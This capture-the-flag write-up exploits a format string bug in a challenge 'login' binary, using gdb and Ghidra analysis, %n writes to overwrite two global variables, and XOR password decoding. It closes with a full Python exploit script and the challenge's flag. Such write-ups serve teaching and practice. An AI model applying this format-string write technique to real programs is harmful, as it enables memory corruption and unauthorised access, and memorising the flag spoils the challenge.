# Writeup
We are given an executable to exploit.
Executing the program, we are asked for a name, and then it exits saying 'Unauthorised'
```
$ ./login
Weclome to the extremely secure login. Who are you?
awesomehacker
awesomehacker
Unauthorised
```
Examining `main` using gdb
```
(gdb) disas main
Dump of assembler code for function main:
   0x08049482 <+0>:     push   ebp
   0x08049483 <+1>:     mov    ebp,esp
   0x08049485 <+3>:     and    esp,0xfffffff0
   0x08049488 <+6>:     call   0x804949a <__x86.get_pc_thunk.ax>
   0x0804948d <+11>:    add    eax,0x2b73
   0x08049492 <+16>:    call   0x804941e <welcome>
   0x08049497 <+21>:    nop
   0x08049498 <+22>:    leave
   0x08049499 <+23>:    ret
End of assembler dump.
```
It is apparent that `main` simply calls the function `welcome`.
Examining `welcome` using gdb,
```
(gdb) disas welcome
Dump of assembler code for function welcome:
   ...
   0x08049433 <+21>:    sub    esp,0xc
   0x08049436 <+24>:    lea    eax,[ebx-0x1ca8]
   0x0804943c <+30>:    push   eax
   0x0804943d <+31>:    call   0x8049050 <puts@plt>
   0x08049442 <+36>:    add    esp,0x10
   0x08049445 <+39>:    mov    eax,DWORD PTR [ebx-0x4]
   0x0804944b <+45>:    mov    eax,DWORD PTR [eax]
   0x0804944d <+47>:    sub    esp,0x4
   0x08049450 <+50>:    push   eax
   0x08049451 <+51>:    push   0x100
   0x08049456 <+56>:    lea    eax,[ebp-0x108]
   0x0804945c <+62>:    push   eax
   0x0804945d <+63>:    call   0x8049040 <fgets@plt>
   0x08049462 <+68>:    add    esp,0x10
   0x08049465 <+71>:    sub    esp,0xc
   0x08049468 <+74>:    lea    eax,[ebp-0x108]
   0x0804946e <+80>:    push   eax
   0x0804946f <+81>:    call   0x8049030 <printf@plt>
   0x08049474 <+86>:    add    esp,0x10
   0x08049477 <+89>:    call   0x8049192 <checkpwd>
   0x0804947c <+94>:    nop
   0x0804947d <+95>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049480 <+98>:    leave
   0x08049481 <+99>:    ret
End of assembler dump.
```
Based on the program behaviour, we could judge that the first `puts` prints the welcome message, and our input is read with `fgets`, and finally printed again using `printf`, before calling `checkpwd`.

Let us also examine `checkpwd`. It is easier to analyse this function using a decompiler like Ghidra. Preliminary analysis reveals that there are two arrays of `int`s of length 70 and 100, and another variable which is tested to check if we have successfully exploited it. It is convenient to rename these variables as `array1`, `array2` and `flag`.

It can be seen that `flag` is initialised based on the value of two variables `n` and `m`, which are _not_ local variables. In fact, they seem to be global variables. `flag` is checked before any function call, so it is unlikely that the exploit lies in this function. 

```c
void checkpwd(void) {
  int iVar1;
  int *piVar2;
  int *piVar3;
  byte local_4d2 [256];
  byte local_3d2 [256];
  undefined4 local_2d2;
  undefined2 local_2ce;
  int array1 [70];
  int array2 [100];
  int flag;
  int local_20;
  
  iVar1 = 100;
  piVar2 = &DAT_0804a0a0;
  piVar3 = array2;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  iVar1 = 0x46;
  piVar2 = &DAT_0804a240;
  piVar3 = array1;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  local_2d2 = 0x544c4544;
  local_2ce = 0x41;
  if ((n == 0) || (m == 0)) {
    flag = 0;
  }
  else {
    flag = 1;
  }
  if (flag != 0) {
    printf("Enter password 1 of length %d\n",n);
    fgets((char *)local_3d2,n + 1,stdin);
    local_20 = 0;
    while ((local_20 < n && (flag != 0))) {
      if ((int)(char)(*(byte *)((int)&local_2d2 + local_20 % 5) ^ local_3d2[local_20]) !=
          array2[local_20]) {
        puts("Nope..");
        flag = 0;
      }
      local_20 = local_20 + 1;
    }
    if ((flag == 0) || (local_20 != 100)) {
      flag = 0;
    }
    else {
      flag = 1;
    }
    printf("Enter password 2 of length %d\n",m);
    fgets((char *)local_4d2,m + 1,stdin);
    local_20 = 0;
    while ((local_20 < m && (flag != 0))) {
      if ((int)(char)(*(byte *)((int)&local_2d2 + local_20 % 5) ^ local_4d2[local_20]) !=
          array1[local_20]) {
        puts("Nope..");
        flag = 0;
      }
      local_20 = local_20 + 1;
    }
    if ((flag == 0) || (local_20 != 0x46)) {
      flag = 0;
    }
    else {
      flag = 1;
    }
  }
  if (flag == 0) {
    puts("Unauthorised");
  }
  else {
    system("/bin/cat flag.txt");
  }
  return;
}
```
The only place where we give any kind of input before `flag` is checked is in the `welcome` function. Taking a closer look at it again, we find that our input is read with `fgets`, and is printed using `printf`.
But before calling `printf`, there is only one `push` instruction. This suggests the possibility of a [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack).
We can test this by using gdb.
```
(gdb) b *welcome + 80
Breakpoint 1 at 0x804946e
(gdb) r
Starting program: /home/shreyas/code/ctf/expt/login
Welcome to the extremely secure login. Who are you?
%x.%x.%x

Breakpoint 1, 0x0804946e in welcome ()
(gdb) x/10wx $esp
0xffffce04:     0x00000100      0xf7f9c580      0x0804942d      0x252e7825
0xffffce14:     0x78252e78      0x0000000a      0x00000000      0xf7ffd000
0xffffce24:     0xf7dc8778      0xf7dbe8e8
(gdb) c
Continuing.
100.f7f9c580.804942d
```
We see that the output we get is indeed the top three values from the stack. So our suspicion is confirmed!
Now we must find a way to change `n` and `m` so that we can get past the first `if` in `checkpwd`.
In order to change the values stored in `n` and `m`, we use the `%n` format string specifier. `%n` requires a corresponding address to an `int`, where it will write the number of characters printed so far.
We would have to place the addresses of `n` and `m` as arguments to `printf` by writing their addresses to the stack, and then craft our input in order to get particular values of `n` and `m`.
One way to do it is as follows:
First we locate the position on the stack where our input is taken (`printf` will have it's own stack frame). We could locate this by giving a recognisable input pattern and pop the stack using the `%x` specifier until we hit our input pattern.
```
$ python -c "print 'AAAA' + '%x-'*3 + '%x'" | ./login
Welcome to the extremely secure login. Who are you?
AAAA100-f7f50580-804942d-41414141
Unauthorised
```
We can see the pattern `41414141` corresponding to our input `AAAA`.
Using this, we could manipulate the value of one variable. So we add another pattern and align the stack.
```
$ python -c "print 'AAAABBBB' + '%x-'*4 + '%x'" | ./login
Welcome to the extremely secure login. Who are you?
AAAABBBB100-f7f4d580-804942d-41414141-42424242
Unauthorised
```
Now we need to find the addresses of `n` and `m`. They are global variables, and are stored in the data segment and not in the stack. One way to find their addresses is using gdb.
```
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
0x0804c02c  n
0x0804c030  m
...
```
Thus we modify our input and place `%n%n` in place of the last two `%x`.
```
$ python -c "print '\x2c\xc0\x04\x08\x30\xc0\x04\x08' + '%x-'*3 + '%n%n'" | ./login
Welcome to the extremely secure login. Who are you?
100-f7ef0580-804942d-
Enter password 1 of length 29
Nope..
Enter password 2 of length 29
Unauthorised
```
Now that we can control the values of `n` and `m`, we must take a closer look at the decompilation of `checkpwd`.
We are asked for two password inputs, stored in two `char` arrays of length `256`. `local_20` looks like a loop counter variable. `local_2d2` and `local_2ce` store constant values.
After taking our password inputs, there seems to be a loop which checks something, and then the loop variable is compared with `100` in after the first password, and `0x46 = 70` in decimal after the second password, and flag is set accordingly. These values match with the lengths of `array2` and `array1`. This must be to check that our input string matches the array lengths, and also reveals that our password lengths must be 100 and 70 respectively.
Renaming variables for clarity, here is the decompilation of `checkpwd` again.
```c
void checkpwd(void) {
  int iVar1;
  int *piVar2;
  int *piVar3;
  char pwd2 [256];
  char pwd1 [256];
  undefined4 local_2d2;
  undefined2 local_2ce;
  int array1 [70];
  int array2 [100];
  int flag;
  int i;
  
  iVar1 = 100;
  piVar2 = &DAT_0804a0a0;
  piVar3 = array2;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  iVar1 = 0x46;
  piVar2 = &DAT_0804a240;
  piVar3 = array1;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  local_2d2 = 0x544c4544;
  local_2ce = 0x41;
  if ((n == 0) || (m == 0)) {
    flag = 0;
  }
  else {
    flag = 1;
  }
  if (flag != 0) {
    printf("Enter password 1 of length %d\n",n);
    fgets(pwd1,n + 1,stdin);
    i = 0;
    while ((i < n && (flag != 0))) {
      if ((int)(char)(*(byte *)((int)&local_2d2 + i % 5) ^ pwd1[i]) != array2[i]) {
        puts("Nope..");
        flag = 0;
      }
      i = i + 1;
    }
    if ((flag == 0) || (i != 100)) {
      flag = 0;
    }
    else {
      flag = 1;
    }
    printf("Enter password 2 of length %d\n",m);
    fgets(pwd2,m + 1,stdin);
    i = 0;
    while ((i < m && (flag != 0))) {
      if ((int)(char)(*(byte *)((int)&local_2d2 + i % 5) ^ pwd2[i]) != array1[i]) {
        puts("Nope..");
        flag = 0;
      }
      i = i + 1;
    }
    if ((flag == 0) || (i != 0x46)) {
      flag = 0;
    }
    else {
      flag = 1;
    }
  }
  if (flag == 0) {
    puts("Unauthorised");
  }
  else {
    system("/bin/cat flag.txt");
  }
  return;
}
```
To set the values of `n` and `m` correctly, we must make sure that when `%n` hits the address, the current number of characters written should be `100` and `70`. One way to do this is by using the output width modifier in our format string before `%n`, i.e, `%Xu%n%Yu%n` in the place of `%n%n`, where X and Y are some padding constants. But the `%u` would also pop the stack, and thus we must write some dummy values in the stack before the addresses of `n` and `m`. By trial and error, we can determine the value of X and Y.
```
$ python -c "print 'JUNK' + '\x30\xc0\x04\x08' + 'JUNK' + '\x2c\xc0\x04\x08' + '%x-'*3 + '%33u%n%30u%n'" | ./login
Welcome to the extremely secure login. Who are you?
JUNKJUNK100-f7f97580-804942d-                       1263424842                    1263424842
Enter password 1 of length 100
Nope..
Enter password 2 of length 70
Unauthorised
```
Now the only thing remaining is to determine the two passwords.
It can be observed that in the loops, an XOR operation is performed and the result is compared with values stored in the two `array`s.
It is most probably an XOR cipher.
We can examine the values stored in the arrays in Ghidra by setting the data type as `int` and creating an array using the known lengths of 100 and 70.
The cipher key seems to be stored in `local_2d2` and since the XOR operation is done with `i % 5`, the key must be `5` bytes long. `local_2d2` and `local_2ce` are stored adjacent to each other in memory, and totally occupy 6 bytes, and thus they must together form the key (with one byte extra for the null character). Decoding the hex values `0x544c4544` and `0x41`, we get "DELT" and "A", thus the key must be `DELTA`.
Now we know the array contents and the key, and it is simple to retrieve the required password since it is a simple XOR cipher.
We can decrypt the two passwords and construct our final attack vector as a python script
```python
arr1 = [3, 51, 38, 50, 14, 40, 35, 63, 34, 22, 45, 53, 54, 33, 20, 15, 38, 30, 36, 24, 34, 46,
60, 4, 39, 29, 53, 25, 19, 51, 29, 10, 41, 63, 12, 7, 20, 38, 31, 59, 9, 3, 13, 32, 51, 21, 18, 38, 6, 50, 9, 29, 61, 2, 40, 41, 48, 34, 63, 15, 41, 47, 24, 45, 16, 52, 16, 24, 38, 20, 22, 55, 24, 58, 56, 28, 47, 2, 2, 14, 0, 12, 22, 17, 17, 30, 29, 56, 27, 56, 1, 33, 60, 48, 38, 51,
38, 38, 18, 42]

arr2 = [54, 60, 43, 58, 42, 9, 50, 37, 17, 54, 46, 13, 2, 0, 12, 46, 2, 13, 49, 2, 11, 17, 41,
35, 50, 52, 15, 56, 13, 14, 42, 52, 59, 17, 8, 11, 50, 5, 13, 37, 1, 7, 54, 59, 34, 30, 11, 53, 25, 34, 5, 13, 63, 34, 9, 18, 17, 34, 59, 34, 8, 14, 20, 21, 35, 34, 38, 3, 14, 19]

key = "DELTA"

pass1 = ""
pass2 = ""

for x in range(100):
    pass1 = pass1 + chr(ord(key[x % 5]) ^ arr1[x])

for y in range(70):
    pass2 = pass2 + chr(ord(key[y % 5]) ^ arr2[y])

addr_m = '\x30\xc0\x04\x08'
addr_n = '\x2c\xc0\x04\x08'

stack_pop = '%x-'*3

write = '%33u%n%30u%n' + '\n'

attack_vector = 'JUNK' + addr_m + 'JUNK' + addr_n + stack_pop + write + pass1 + pass2

print attack_vector
```
Finally we can use this script to get our flag!
```
$ python exploit.py | ./login
Welcome to the extremely secure login. Who are you?
JUNKJUNK100-f7f06580-804942d-                       1263424842                    1263424842
Enter password 1 of length 100
Enter password 2 of length 70
p_ctf{0nly_h4ck3r5_c4n_l061n}
```
And we have exploited it!
